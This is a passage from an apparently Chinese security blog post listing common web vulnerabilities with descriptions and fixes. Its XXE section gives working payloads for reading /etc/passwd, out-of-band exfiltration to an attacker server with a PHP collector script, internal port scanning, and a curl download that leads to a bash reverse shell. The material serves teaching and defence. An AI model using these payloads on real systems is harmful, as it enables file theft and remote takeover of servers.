id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h1><h2 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>借助XXE，攻击者可以实现任意文件读取，DDOS拒绝服务攻击以及代理扫描内网等。</p><h3 id="1-任意文件读取漏洞测试"><a href="#1-任意文件读取漏洞测试" class="headerlink" title="1.任意文件读取漏洞测试"></a><strong>1.任意文件读取漏洞测试</strong></h3><p>当有回显时，直接利用payload：</p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code></p><p><code>&lt;!DOCTYPE XXE [</code></p><p><code>&lt;!ELEMENT name ANY &gt;</code></p><p><code>&lt;!ENTITY XXE SYSTEM &quot;file://etc/passwd&quot; &gt;]&gt;</code></p><p><code>&lt;root&gt;</code></p><p><code>&lt;name&gt;&amp;XXE;&lt;/name&gt;</code></p><p><code>&lt;/root&gt;</code></p><p>可以进行任意文件读取文件： </p><p><img src="/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/1.png"></p><p>当无回显时，引用远程服务器上的XML文件读取文件：</p><p>将以下get.php,1.xml保存到自己的WEB服务器下</p><p>get.php:</p><?php$xml=$_GET['xml'];$base=base64_decode($xml);file_put_contents('data.txt', $base);?><p>1.xml:</p><p><code>&lt;!ENTITY % payloadSYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</code></p><p><code>&lt;!ENTITY % int &quot;&lt;!ENTITY % trick SYSTEM &#39;http://192.168.55.129/get.php?xml=%payload;&#39;&gt;&quot;&gt;</code></p><p><code>%int;</code></p><p><code>%trick;</code></p><p>直接发送payload:</p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</code></p><p><code>&lt;!DOCTYPE root [</code></p><p><code>&lt;!ENTITY % remote SYSTEM &quot;http://192.168.55.129/1.xml&quot;&gt;</code></p><p><code>%remote;]&gt;</code></p><p><code>&lt;root/&gt;</code></p><p>就能读取任意文件并把数据保存到本地的data.txt文件里： </p><p><img src="/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/15214520942084.png"></p><h3 id="2-探测内网端口和网站"><a href="#2-探测内网端口和网站" class="headerlink" title="2.探测内网端口和网站"></a><strong>2.探测内网端口和网站</strong></h3><p>有回显时，直接发送payload：</p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code></p><p><code>&lt;!DOCTYPE XXE [</code></p><p><code>&lt;!ELEMENT name ANY &gt;</code></p><p><code>&lt;!ENTITY XXE SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;</code></p><p><code>&lt;root&gt;</code></p><p><code>&lt;name&gt;&amp;XXE;&lt;/name&gt;</code></p><p><code>&lt;/root&gt;</code></p><p>端口存在时会返回页面报错信息： </p><p><img src="/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/15214521104806.png"></p><p>端口不存在时，返回无法连接的报错信息： </p><p><img src="/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/15214521243059.png"></p><p>无回显时，修改1.xml文件，把file协议修改为需要扫描的IP：</p><p><code>&lt;!ENTITY % payloadSYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://192.168.55.129&quot;&gt;</code></p><p><code>&lt;!ENTITY % int &quot;&lt;!ENTITY % trick SYSTEM &#39;http://192.168.55.129/get.php?xml=%payload;&#39;&gt;&quot;&gt;</code></p><p><code>%int;</code></p><p><code>%trick;</code></p><p>直接发送payload:</p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</code></p><p><code>&lt;!DOCTYPE root [</code></p><p><code>&lt;!ENTITY % remote SYSTEM &quot;http://192.168.55.129/1.xml&quot;&gt;</code></p><p><code>%remote;]&gt;</code></p><p><code>&lt;root/&gt;</code></p><p>当端口存在web页面，也可获得内网网站的的页面源代码： </p><p><img src="/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/15214521406089.png"></p><h3 id="3-攻击内网网站"><a href="#3-攻击内网网站" class="headerlink" title="3.攻击内网网站"></a><strong>3.攻击内网网站</strong></h3><p>若内网网站存在命令执行漏洞时：</p><p>将以下bash.txt保存至自己的WEB服务器下：</p><p>bash.txt:</p><p>bash -i &gt;&amp; /dev/tcp/192.168.55.129/8877 0&gt;&amp;1</p><p>发送以下payload获取bash.txt文件：</p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code></p><p><code>&lt;!DOCTYPE XXE [</code></p><p><code>&lt;!ELEMENT name ANY &gt;</code></p><p><code>&lt;!ENTITY XXE SYSTEM &quot;http://127.0.0.1/hack.php?1=curl%20-o%20/tmp/1.txt%20192.168.55.129/bash.txt&quot; &gt;]&gt;</code></p><p><code>&lt;root&gt;</code></p><p><code>&lt;name&gt;&amp;XXE;&lt;/name&gt;</code></p><p><code>&lt;/root&gt;</code> </p><p><img src="/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/15214521586884.png"></p><p>在本机监听一个端口： </p><p><img src="/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/15214521755676.png"></p><p>发送一下payload，获得反弹shellcode命令：</p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code></p><p><code>&lt;!DOCTYPE XXE [</code></p><p><code>&lt;!ELEMENT name ANY &gt;</code></p><p><code>&lt;!ENTITY XXE SYSTEM &quot;http://127.0.0.1/hack.php?1=/bin/bash%20/tmp/1.txt&quot; &gt;]&gt;</code></p><p><code>&lt;root&gt;</code></p><p><code>&lt;name&gt;&amp;XXE;&lt;/name&gt;</code></p><p><code>&lt;/root&gt;</code> </p><p><img src="/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/15214521912561.png"></p><h3 id="4-执行系统命令"><a href="#4-执行系统命令" class="headerlink" title="4.执行系统命令"></a><strong>4.执行系统命令</strong></h3><p>若安装expect扩展的PHP环境里还可以直接执行系统命令，其他协议也有可能可以执行系统命令。</p><p>直接执行payload:</p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code></p><p><code>&lt;!DOCTYPE XXE [</code></p><p><code>&lt;!ELEMENT name ANY &gt;</code></p><p><code>&lt;!ENTITY XXE SYSTEM &quot;expect://id&quot; &gt;]&gt;</code></p><p><code>&lt;root&gt;</code></p><p><code>&lt;name&gt;&amp;XXE;&lt;/name&gt;</code></p><p><code>&lt;/root&gt;</code></p><h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p>防御XXE攻击主要有三方面：一是检查所使用的底层XML解析库，默认禁止外部实体的解析；二是若使用第三方应用代码需要及时升级补丁；三是对用户提交的XML数据进行过滤，如关键词：&lt;!DOCTYPE和&lt;!ENTITY或者SYSTEM和PUBLIC等。</p><h1 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h1><h2 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><h2 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、验证请求的Referer是否来自本网站，但可被绕过。</p><p>　　2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p><h1 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5.SSRF"></a>5.SSRF</h1><h2 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p><p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p><p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p><p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p><p>　　(5)、利用File协议读取本地文件。</p><h2 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p><p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p><p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>　　4、验证请求的文件格式</p><p>​        5、禁止跳转</p><p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p><p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><h1 id="6-任意命令-代码执行"><a href="#6-任意命令-代码执行" class="headerlink" title="6.任意命令/代码执行"></a>6.任意命令/代码执行</h1><h2 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p><h2 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>　　2、减少或不使用代码或命令执行函数</p><p>　　3、客户端提交的变量在放入函数前进行检测</p><p>　　4、减少或不使用危险函数</p><h1 id="7-任意文件上传"><a href="#7-任意文件上传" class="headerlink" title="7.任意文件上传"></a>7.任意文件上传</h1><h2 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p><h2 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p><p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p><p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p><p>　　4、严格限制上传的文件路径。</p><p>　　5、文件扩展名服务端白名单校验。</p><p>　　6、文件内容服务端校验。</p><p>　　7、上传文件重命名。</p><p>　　8、隐藏上传文件路径。</p><h1 id="8-目录穿越-目录遍历"><a href="#8-目录穿越-目录遍历" class="headerlink" title="8.目录穿越/目录遍历"></a>8.目录穿越/目录遍历</h1><h2 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。</p><h2 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。</p><h1 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h1><h2 id="漏洞描述-8"><a href="#漏洞描述-8" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p><h2 id="修复-8"><a href="#修复-8" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、严格检查变量是否已经初始化。</p><p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</p><p>　　3、严格检查文件包含函数中的参数是否外界可控。</p><h1 id="10-弱口令"><a href="#10-弱口令" class="headerlink" title="10.弱口令"></a>10.弱口令</h1><h2 id="漏洞描述-9"><a href="#漏洞描述-9" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p><p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p><h2 id="修复-9"><a href="#修复-9" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p><p>　　2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p><p>　　3、增加人机验证机制，限制ip访问次数。</p><h1 id="11-暴力破解"><a href="#11-暴力破解" class="headerlink" title="11.暴力破解"></a>11.暴力破解</h1><h2 id="漏洞描述-10"><a href="#漏洞描述-10" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p><h2 id="修复-10"><a href="#修复-10" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p><p>　　2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p><p>​        3、增加人机验证机制</p><p>　　4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p><h1 id="12-越权访问"><a href="#12-越权访问" class="headerlink" title="12.越权访问"></a>12.越权访问</h1><h2 id="漏洞描述-11"><a href="#漏洞描述-11" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p><h2 id="修复-11"><a href="#修复-11" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、对用户访问角色的权限进行严格的检查及限制。</p><p>　　2、在一些操作时可以使用session对用户的身份进行判断和控制</p><h1 id="13-未授权访问"><a href="#13-未授权访问" class="headerlink" title="13.未授权访问"></a>13.未授权访问</h1><h2 id="漏洞描述-12"><a href="#漏洞描述-12" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p><h2 id="修复-12"><a href="#修复-12" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p><p>　　2、可以使用session对用户的身份进行判断和控制。</p><h1 id="14-列目录"><a href="#14-列目录" class="headerlink" title="14.列目录"></a>14.列目录</h1><h2 id="漏洞描述-13"><a href="#漏洞描述-13" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p><h2 id="修复-13"><a href="#修复-13" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p><p>　　2、设置目录访问权限</p><h1 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h1><h2 id="漏洞描述-14"><a href="#漏洞描述-14" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p><p>可参考：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><h2 id="修复-14"><a href="#修复-14" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、对传入的对象进行严格的过滤检查</p><p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p><h1 id="16-http-slow拒绝服务攻击"><a href="#16-http-slow拒绝服务攻击" class="headerlink" title="16.http slow拒绝服务攻击"></a>16.http slow拒绝服务攻击</h1><h2 id="漏洞描述-15"><a href="#漏洞描述-15" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p><h2 id="修复-15"><a href="#修复-15" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p><p>　　1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p><p>　　2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p><p>　　3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接。</p><h1 id="17-CRLF注入"><a href="#17-CRLF注入" class="headerlink" title="17.CRLF注入"></a>17.CRLF注入</h1><h2 id="漏洞描述-16"><a href="#漏洞描述-16" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p><h2 id="修复-16"><a href="#修复-16" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p><h1 id="18-LDAP注入"><a href="#18-LDAP注入" class="headerlink" title="18.LDAP注入"></a>18.LDAP注入</h1><h2 id="漏洞描述-17"><a href="#漏洞描述-17" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p><h2 id="修复-17"><a href="#修复-17" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　对用户的输入内容进行严格的过滤。</p><h1 id="19-URL-跳转"><a href="#19-URL-跳转" class="headerlink" title="19.URL 跳转"></a>19.URL 跳转</h1><h2 id="漏洞描述-18"><a href="#漏洞描述-18" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p><h2 id="修复-18"><a href="#修复-18" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、在进行页面跳转前校验传入的URL是否为可信域名。</p><p>　　2、白名单规定跳转链接</p><h1 id="20-明文传输"><a href="#20-明文传输" class="headerlink" title="20.明文传输"></a>20.明文传输</h1><h2 id="漏洞描述-19"><a href="#漏洞描述-19" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p><h2 id="修复-19"><a href="#修复-19" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p><p>　　2、使用https来保证传输的安全。</p><h1 id="21-网页木马"><a href="#21-网页木马" class="headerlink" title="21.网页木马"></a>21.网页木马</h1><h2 id="漏洞描述-20"><a href="#漏洞描述-20" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a><strong>修复建议</strong></h2><p>　　1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p><p>　　2、发现并及时修复已存在的漏洞。</p><p>　　3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p><h1 id="22-备份文件泄露"><a href="#22-备份文件泄露" class="headerlink" title="22.备份文件泄露"></a>22.备份文件泄露</h1><h2 id="漏洞描述-21"><a href="#漏洞描述-21" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p><h2 id="修复-20"><a href="#修复-20" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、不在网站目录下存放网站备份文件或敏感信息的文件。</p><p>　　2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p><h1 id="23-敏感信息泄露"><a href="#23-敏感信息泄露" class="headerlink" title="23.敏感信息泄露"></a>23.敏感信息泄露</h1><h2 id="漏洞描述-22"><a href="#漏洞描述-22" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p><h2 id="修复-21"><a href="#修复-21" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p><p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p><p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p><p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p><h1 id="24-短信-邮件轰炸"><a href="#24-短信-邮件轰炸" class="headerlink" title="24.短信/邮件轰炸"></a>24.短信/邮件轰炸</h1><h2 id="漏洞描述-23"><a href="#漏洞描述-23" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p><h2 id="修复-22"><a href="#修复-22" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p><h1 id="25-phpinfo信息泄漏"><a href="#25-phpinfo信息泄漏" class="headerlink" title="25.phpinfo信息泄漏"></a>25.phpinfo信息泄漏</h1><h2 id="漏洞描述-24"><a href="#漏洞描述-24" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p><h2 id="修复-23"><a href="#修复-23" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、删除phpinfo 函数。</p><p>　　2、若文件无用可直接删除。 </p><h1 id="26-IIS短文件名泄露漏洞"><a href="#26-IIS短文件名泄露漏洞" class="headerlink" title="26.IIS短文件名泄露漏洞"></a>26.IIS短文件名泄露漏洞</h1><h2 id="漏洞描述-25"><a href="#漏洞描述-25" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p><p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p><h2 id="修复-24"><a href="#修复-24" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　修改Windows配置，关闭短文件名功能。</p><p>　　1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p><p>​       2.如果是虚拟主机空间用户,可采用以下修复方案：</p><p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p><p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p><p>　　3）升级net framework 至4.0以上版本。</p><p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a href="http://www.back,然后删除原文件夹d/www%EF%BC%8C%E5%86%8D%E9%87%8D%E5%91%BD%E5%90%8DD:/www.back%E5%88%B0D:/www%E3%80%82%E5%A6%82%E6%9E%9C%E4%B8%8D%E9%87%8D%E6%96%B0%E5%A4%8D%E5%88%B6%EF%BC%8C%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%88%99%E6%98%AF%E4%B8%8D%E4%BC%9A%E6%B6%88%E5%A4%B1%E7%9A%84%E3%80%82">www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。</a></p><h1 id="27-应用程序错误信息泄露"><a href="#27-应用程序错误信息泄露" class="headerlink" title="27.应用程序错误信息泄露"></a>27.应用程序错误信息泄露</h1><h2 id="漏洞描述-26"><a href="#漏洞描述-26" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p><h2 id="修复-25"><a href="#修复-25" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、自定义错误页面或使用统一的错误页面提示。</p><h1 id="28-Apache-Tomcat默认文件"><a href="#28-Apache-Tomcat默认文件" class="headerlink" title="28.Apache Tomcat默认文件"></a>28.Apache Tomcat默认文件</h1><h2 id="漏洞描述-27"><a href="#漏洞描述-27" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p><h2 id="修复-26"><a href="#修复-26" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、删除样例文件</p><p>　　2、限制文件访问权限</p><h1 id="29-Crossdomain-xml-配置不当"><a href="#29-Crossdomain-xml-配置不当" class="headerlink" title="29.Crossdomain.xml 配置不当"></a>29.Crossdomain.xml 配置不当</h1><h2 id="漏洞描述-28"><a href="#漏洞描述-28" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p><h2 id="修复-27"><a href="#修复-27" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p><h1 id="30-目标服务器启用了不安全-HTTP-方法"><a href="#30-目标服务器启用了不安全-HTTP-方法" 